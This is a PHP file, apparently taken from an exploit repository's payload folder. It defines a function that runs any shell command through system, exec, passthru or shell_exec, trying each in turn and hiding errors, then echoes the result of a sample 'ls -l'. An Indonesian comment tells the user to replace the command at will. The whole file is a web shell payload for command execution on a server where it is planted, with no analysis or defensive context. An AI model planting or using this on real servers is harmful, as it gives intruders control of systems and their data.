<?php
/**
 * @file
 * x.php >> https://github.com/ardzz/exploit/blob/master/payload/cmd.php
 *
 */

/**
 * Main function.
 */
function miaomiao($miao) {
  if (function_exists('system')) {
    @ob_start();
    @system($miao);
    $buff = @ob_get_contents();
    @ob_end_clean();
    return $buff;
  }
  elseif (function_exists('exec')) {
    @exec($miao, $results);
    $buff = "";
    foreach ($results as $result) {
      $buff .= $result;
    }
    return $buff;
  }
  elseif (function_exists('passthru')) {
    @ob_start();
    @passthru($miao);
    $buff = @ob_get_contents();
    @ob_end_clean();
    return $buff;
  }
  elseif (function_exists('shell_exec')) {
    $buff = @shell_exec($miao);
    return $buff;
  }
}

// Contoh perintah, silakan ganti sesuka hati.
echo miaomiao("ls -l");
?>
